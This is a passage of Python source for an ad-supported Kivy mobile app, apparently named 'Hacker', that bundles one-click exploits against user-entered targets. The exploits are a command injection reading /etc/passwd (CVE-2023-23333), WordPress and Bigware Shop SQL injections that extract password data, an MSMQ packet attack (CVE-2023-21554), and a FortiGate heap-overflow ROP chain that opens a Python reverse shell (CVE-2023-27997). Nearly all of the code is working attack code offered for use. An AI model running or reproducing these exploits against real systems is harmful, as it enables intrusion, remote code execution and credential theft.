#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_23333(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter domin ex.(  www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_23333)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_23333(self,obj):
        ip_address = self.t.text
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        try:
            command = 'curl "http://{}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip" | grep "root:.*:0:0"'.format(ip_address)
            output_bytes = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL)
            output = output_bytes.decode("utf-8-sig", errors='replace')
            if 'root' in output:
                self.res = Button(text = f"The IP address {ip_address} is vulnerable to CVE-2023-23333.",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res2 = Button(text = "Output:",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res2)
                self.res1 = TextInput(text = output ,font_size = 20,size_hint_y = None, height = 200)
                self.layout.add_widget(self.res1)
                full_output_command = 'curl "http://{}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip"'.format(ip_address)
                full_output_bytes = subprocess.check_output(full_output_command, shell=True, stderr=subprocess.DEVNULL)
                full_output = full_output_bytes.decode("utf-8-sig", errors='replace')
                with open("full-output.txt", "w") as file:
                    file.write(full_output)
                    self.res2 = Button(text = "The full output has been saved to 'full-output.txt'.",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                    self.layout.add_widget(self.res2)
            else:
                self.res2 = Button(text = f"The IP address {ip_address} is not vulnerable to CVE-2023-23333.",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res2)
        except Exception as e:
            self.res = Button(text = "Exception occurred :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            self.res1 = TextInput(text = repr(e) ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {ip_address}, moving on to next host',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {ip_address}: {e}',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_23488(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.(  https://www.google.com/ ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='Paid Memberships Pro < 2.9.8 (WordPress Plugin) Vulnerable to CVE_2023_23488 ',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_23488)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_23488(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        target_url = self.t.text
        try:
            def get_request(target_url, delay="1"):
                payload = "a' OR (SELECT 1 FROM (SELECT(SLEEP(" + delay + ")))a)-- -"
                data = {'rest_route': '/pmpro/v1/order','code': payload}
                return requests.get(target_url, params=data).elapsed.total_seconds()
            self.res2 = Button(text = 'Unauthenticated SQL Injection',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res2)
            try:
                req = requests.get(target_url, timeout=15)
                self.res = Button(text = '[-] Testing if the target is vulnerable',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)

            except:
                self.res = Button(text = '[!] ERROR: Target is unreachable ',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)

            if get_request(target_url, "1") >= get_request(target_url, "2"):
                self.r = Button(text = ' [!] The target does not seem vulnerable ',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.r)

            self.rd = Button(text = '[*] The target is vulnerable:',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.rd)

            dat = f'[+] You can dump the whole WordPress database with:\nsqlmap -u "{target_url}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump\n\n[+] To dump data from specific tables:\nsqlmap -u "{target_url}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users\n\n[+] To dump only WordPress usernames and passwords columns (you should check if users table have the default name):\nsqlmap -u "{target_url}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users -C user_login,user_pass'
            self.ress = TextInput(text = dat,font_size = 20,size_hint_y = None, height = 400)
            self.layout.add_widget(self.ress)
        except Exception as e:
            self.res = Button(text = "Exception occurred :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            self.res1 = TextInput(text = repr(e) ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {target_url}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {target_url}: {e}',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_21554(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter ip or domin ex.(  www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='exploit CVE_2023_21554 :',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_21554)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_21554(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        ip_address = self.t.text
        try:
            base_path = ".\\data\\"
            port = 1801

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip_address, port))

            f = open(base_path + "establish_connection.bin", "rb")
            ec = f.read()
            f.close()

            f = open(base_path + "connection_parameters.bin", "rb")
            cp = f.read()
            f.close()

            f = open(base_path + "user_message.bin", "rb")
            um = f.read()
            data = bytearray(um)
            f.close()

            for i in range(0, 1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip_address, port))
                sock.sendall(ec)
                self.res = Button(text = "[+] Establish connection.",size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.ress = TextInput(text = sock.recv(1024) ,font_size = 20,size_hint_y = None, height = 200)
                self.layout.add_widget(self.ress)
 
                sock.sendall(cp)
                self.r = Button(text = "[+] Connection parameters.",size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.r)
                self.rs = TextInput(text = sock.recv(1024) ,font_size = 20,size_hint_y = None, height = 200)
                self.layout.add_widget(self.rs)
 
                sock.sendall(data)
                self.re = Button(text = "[+] User message.",size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.re)
                self.rse = TextInput(text = sock.recv(1024) ,font_size = 20,size_hint_y = None, height = 200)
                self.layout.add_widget(self.rse)
                sock.close()
        except Exception as e:
            self.res = Button(text = "Exception occurred :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            self.res1 = TextInput(text = repr(e) ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {ip_address}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {ip_address}: {e}',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_27997(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter ip or domin ex.(  www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='exploit CVE_2023_27997 :',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_27997)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_27997(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        target_host = self.t.text
        context = ssl.SSLContext()
        target_port = "443"
        reverse = "0.0.0.0"
        params = "query"
        strparams = "["
        for param in params:
            strparams += "'"+param+"',"
        strparams = strparams[:-1]
        strparams += "]"
#binary functions
        execve = p64(0x0042e050)
#binary gadgets
        movrdirax = p64(0x00000000019d2196)# : mov rdi, rax ; call r13
        poprsi = p64(0x000000000042f0f8)# : pop rsi ; ret)
        poprdx = p64(0x000000000042f4a5)# : pop rdx ; ret)
        jmprax = p64(0x0000000000433181)#: jmp rax)
        pops = p64(0x000000000165cfd7)# : pop rdx ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret)
        poprax = p64(0x00000000004359af)# : pop rax ; ret)
        gadget1 = p64(0x0000000001697e0d); #0x0000000001697e0d : push rbx ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
        poprdi = p64(0x000000000042ed7e)# : pop rdi ; ret
        rax3 = gadget1
#hardcoded value which would probably need to be bruteforced or leaked
        hardcoded = 0x00007fc5f128e000

        scbase = p64(hardcoded)
        rdi = p64(hardcoded + 0xc48)
        cmd = p64(hardcoded + 0xd38)
        asdf = hardcoded + 0xd38
        cmd1 = p64(asdf)
        cmd2 = p64(asdf+16)
        arg1 = p64(asdf+48)
        arg2 = p64(asdf+56)
        arg3 = p64(asdf+64)

        ropchain = poprax
        ropchain += execve
        ropchain += poprdi
        ropchain += cmd1
        ropchain += poprsi
        ropchain += cmd2
        ropchain += poprdx
        ropchain += p64(0)
        ropchain += jmprax
        ropchain += b"/bin/python\x00\x00\x00\x00\x00"
        ropchain += arg1
        ropchain += arg2
        ropchain += arg3
        ropchain += p64(0)
        ropchain += b"python\x00\x00"
        ropchain += b"-c\x00\x00\x00\x00\x00\x00"
        ropchain += b"""import socket,sys,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('"""+ reverse.encode() + b"""',31337))\n[os.dup2(s.fileno(),x) for x in range(3)]\ni=os.fork()\nif i==0:\n os.execve('/bin/sh', """+strparams.encode()+b""",{})\n\x00\x00"""
        try:
            with socket.create_connection((target_host, int(target_port,10))) as sock:
                with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                    ssock.settimeout(2)
                    context.verify_mode = ssl.CERT_NONE
                    payload = b"A"*173096+rdi+poprdi+cmd+pops+b"A"*40+pops+rax3+b"C"*32+ropchain
                    tosend = b"POST /remote/error HTTP/1.1\r\nHost: "+target_host +b"\r\nContent-Length: 115964117980\r\n\r\n" + payload
                    ssock.sendall(tosend)
                    r = ssock.recv(10024)
                    self.res1 = TextInput(text = r ,font_size = 20,size_hint_y = None, height = 300)
                    self.layout.add_widget(self.res1)
        except Exception as e:
            self.res = Button(text = "Exception occurred :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            self.res1 = TextInput(text = repr(e) ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {target_host}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {target_host}: {e}',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def Bigware_Shop(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter ip or domin ex.(  www.google.com ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='Bigware Shop is prone to an SQL-injection vulnerability because it fails to sufficiently',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_Bigware_Shop)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_Bigware_Shop(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        url = self.t.text
        headerdata = {'Content-type': 'application/x-www-form-urlencoded'}
        sqli = '2 AND (SELECT 1 FROM(SELECT COUNT(*), CONCAT((SELECT former_email_address FROM former where former_groups_id like 1 LIMIT 0,1), CHAR(58), (SELECT former_password FROM former where former_groups_id like 1 LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)'
        postdata = {  'voteid' : '2', \
              'pollid' : sqli, \
               'x' : '1', \
               'y' : '1', \
               'forwarder' : 'http%3a%2f%2fdemoshop.bigware.org%2fmain_bigware_53.php%3fop%3dresults%26pollid%3d2'
        }
        
        try:
            response = requests.get(url, headers=headerdata, data=postdata)
            if response.status_code == 500:
                self.res = Label(text = "If there is an error stating the duplicate admin entry, your sit is vulnerable.",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                respon = response
                self.r = TextInput(text = respon ,font_size = 20,size_hint_y = None, height = 100)
                self.layout.add_widget(self.r)
                self.res2 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 400)
                self.layout.add_widget(self.res2)
            else :
                respon = response
                self.r = TextInput(text = respon ,font_size = 20,size_hint_y = None, height = 100)
                self.layout.add_widget(self.r)
                self.res2 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 400)
                self.layout.add_widget(self.res2)
        except requests.exceptions.Timeout:
            self.res = Label(text = f'Timeout on host {url}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Label(text = f'Error on host {url}: {e}',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
 
################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################
#                                                         ads adsssssssss
################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################



if __name__ == '__main__':
    Hacker().run()
